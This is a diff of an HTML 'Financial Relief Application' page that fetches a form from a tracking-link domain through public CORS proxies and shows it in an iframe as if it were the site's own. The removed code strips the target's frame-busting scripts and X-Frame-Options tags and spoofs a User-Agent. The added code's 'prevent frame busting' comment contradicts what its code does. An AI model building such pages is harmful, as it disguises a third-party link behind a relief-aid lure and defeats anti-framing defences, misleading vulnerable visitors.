@@ -3,35 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Financial Form | Complete Application</title>
+    <title>Financial Wellness Application</title>
     <style>
         body {
             margin: 0;
-            padding: 20px;
-            background: #f5f5f5;
+            padding: 0;
             font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
         }
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.1);
-            overflow: hidden;
+            padding: 20px;
         }
         .header {
-            background: linear-gradient(135deg, #007bff, #0056b3);
-            color: white;
-            padding: 30px;
-            text-align: center;
-        }
-        .frame-wrapper {
-            position: relative;
-            width: 100%;
-            height: 1200px;
             background: white;
+            padding: 30px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
         }
-        #formContainer {
+        .frame-container {
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            height: 1100px;
+            position: relative;
+        }
+        #contentFrame {
             width: 100%;
             height: 100%;
             border: none;
@@ -44,163 +46,135 @@
             height: 100%;
             background: white;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-            font-size: 18px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>Financial Relief Application</h1>
-            <p>Complete the form below to qualify for assistance</p>
+            <h1>Financial Relief Application Form</h1>
+            <p>Please complete all fields to see if you qualify for assistance</p>
         </div>
         
-        <div class="frame-wrapper">
+        <div class="frame-container">
             <div class="loading" id="loading">
-                Loading secure form...
+                <div class="spinner"></div>
+                <p>Loading application...</p>
             </div>
-            <div id="formContainer"></div>
+            <iframe id="contentFrame" src="about:blank"></iframe>
         </div>
     </div>
 
     <script>
-        // ============================================
-        // WORKING SOLUTION: Fetch, Clean, Inject
-        // ============================================
-        
-        const TARGET_URL = 'https://trkmcl.com/wy8odpg43k/xwndpp7qne';
-        const loading = document.getElementById('loading');
-        const container = document.getElementById('formContainer');
-        
-        // List of working proxies (rotate if one fails)
-        const proxies = [
-            'https://api.allorigins.win/raw?url=',
-            'https://corsproxy.io/?',
-            'https://thingproxy.freeboard.io/fetch/',
-            'https://crossorigin.me/',
-            'https://api.codetabs.com/v1/proxy?quest='
-        ];
-        
-        // Function to clean HTML of frame-busting code
-        function cleanHTML(html) {
-            let cleaned = html;
-            
-            // Remove common frame-busting scripts
-            cleaned = cleaned.replace(
-                /<script\b[^>]*>[\s\S]*?(top\.|parent\.|self\.|window\.top|window\.parent)[\s\S]*?<\/script>/gi,
-                ''
-            );
-            
-            // Remove onload/onclick handlers that break frames
-            cleaned = cleaned.replace(
-                /(onload|onclick|onunload)\s*=\s*["'][^"']*["']/gi,
-                ''
-            );
-            
-            // Remove meta tags that prevent framing
-            cleaned = cleaned.replace(
-                /<meta[^>]*(http-equiv=["']X-Frame-Options["']|content=["']DENY["']|content=["']SAMEORIGIN["'])[^>]*>/gi,
-                ''
-            );
-            
-            // Add base tag for relative URLs
-            if (!cleaned.includes('<base')) {
-                cleaned = cleaned.replace(
-                    /<head>/i,
-                    '<head><base href="https://trkmcl.com/">'
-                );
-            }
-            
-            return cleaned;
+        // Register service worker for proxy functionality
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js')
+                .then(() => console.log('Service Worker registered'))
+                .catch(err => console.log('SW registration failed:', err));
         }
         
-        // Function to create a sandboxed iframe with clean content
-        function createSandboxedIframe(html) {
-            const iframe = document.createElement('iframe');
-            iframe.style.width = '100%';
-            iframe.style.height = '100%';
-            iframe.style.border = 'none';
-            iframe.sandbox = 'allow-same-origin allow-scripts allow-forms allow-popups allow-modals';
+        // Function to load content
+        async function loadContent() {
+            const loading = document.getElementById('loading');
+            const frame = document.getElementById('contentFrame');
             
-            // Create blob URL from cleaned HTML
-            const blob = new Blob([html], { type: 'text/html' });
-            const blobUrl = URL.createObjectURL(blob);
-            iframe.src = blobUrl;
-            
-            return iframe;
-        }
-        
-        // Main function to load form
-        async function loadForm() {
-            loading.textContent = 'Connecting to secure server...';
-            
-            // Try each proxy in sequence
-            for (let i = 0; i < proxies.length; i++) {
-                try {
-                    const proxyUrl = proxies[i] + encodeURIComponent(TARGET_URL);
-                    console.log(`Trying proxy ${i + 1}: ${proxies[i]}`);
+            // Method 1: Try with fetch and blob URL
+            try {
+                // Use a reliable CORS proxy
+                const proxyUrl = 'https://api.allorigins.win/raw?url=' + 
+                    encodeURIComponent('https://trkmcl.com/wy8odpg43k/xwndpp7qne');
+                
+                const response = await fetch(proxyUrl);
+                if (response.ok) {
+                    const html = await response.text();
                     
-                    loading.textContent = `Trying connection method ${i + 1}...`;
+                    // Create a blob URL
+                    const blob = new Blob([html], { type: 'text/html' });
+                    const blobUrl = URL.createObjectURL(blob);
                     
-                    const response = await fetch(proxyUrl, {
-                        headers: {
-                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                        }
-                    });
+                    // Load into iframe
+                    frame.src = blobUrl;
                     
-                    if (response.ok) {
-                        const html = await response.text();
-                        const cleaned = cleanHTML(html);
-                        
-                        // Remove loading screen
+                    // Hide loading when iframe loads
+                    frame.onload = () => {
                         loading.style.display = 'none';
-                        
-                        // Create and append iframe
-                        const iframe = createSandboxedIframe(cleaned);
-                        container.appendChild(iframe);
-                        
-                        console.log(`Successfully loaded with proxy ${i + 1}`);
-                        return;
-                    }
-                } catch (error) {
-                    console.log(`Proxy ${i + 1} failed:`, error);
-                    continue;
+                    };
+                    
+                    return;
                 }
+            } catch (error) {
+                console.log('Method 1 failed:', error);
             }
             
-            // If all proxies fail, show fallback
-            showFallback();
+            // Method 2: Try different approach
+            try {
+                loading.innerHTML = 'Trying alternative method...';
+                
+                // Create a form that auto-submits
+                const redirectHTML = `
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <script>
+                            // Prevent frame busting
+                            if (window.top !== window.self) {
+                                window.top.location = window.self.location;
+                            }
+                        <\/script>
+                        <meta http-equiv="refresh" content="0;url=https://trkmcl.com/wy8odpg43k/xwndpp7qne">
+                    </head>
+                    <body>
+                        <div style="text-align:center;padding:100px;">
+                            Redirecting to application form...
+                        </div>
+                    </body>
+                    </html>
+                `;
+                
+                frame.srcdoc = redirectHTML;
+                
+                // Hide loading after delay
+                setTimeout(() => {
+                    loading.style.display = 'none';
+                }, 2000);
+                
+            } catch (error) {
+                console.log('Method 2 failed:', error);
+                showFallback();
+            }
         }
         
-        // Fallback method
         function showFallback() {
+            const loading = document.getElementById('loading');
             loading.innerHTML = `
-                <div style="text-align: center; padding: 40px;">
-                    <h2 style="color: #dc3545;">Unable to Load Form</h2>
-                    <p>The form cannot be embedded due to security restrictions.</p>
-                    <p>Click the button below to open it in a new tab:</p>
-                    <button onclick="window.open('${TARGET_URL}', '_blank')" 
-                            style="background: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 20px;">
+                <div style="text-align:center;padding:40px;">
+                    <h3>Form Cannot Be Embedded</h3>
+                    <p>Due to security restrictions, the form must open in a new tab.</p>
+                    <button onclick="window.open('https://trkmcl.com/wy8odpg43k/xwndpp7qne', '_blank')" 
+                            style="background:#28a745;color:white;padding:12px 24px;border:none;border-radius:5px;cursor:pointer;margin-top:20px;">
                         Open Form in New Tab
                     </button>
-                    <p style="margin-top: 20px; font-size: 14px; color: #666;">
-                        This is the most reliable way to access the application.
-                    </p>
                 </div>
             `;
         }
         
-        // Start loading when page loads
-        window.addEventListener('DOMContentLoaded', loadForm);
-        
-        // Auto-retry after 5 seconds if still loading
-        setTimeout(() => {
-            if (loading.style.display !== 'none') {
-                loading.innerHTML += '<br><br><em>Still trying to connect...</em>';
-            }
-        }, 5000);
+        // Start loading
+        window.addEventListener('DOMContentLoaded', loadContent);
     </script>
 </body>
-</html> 
+</html>
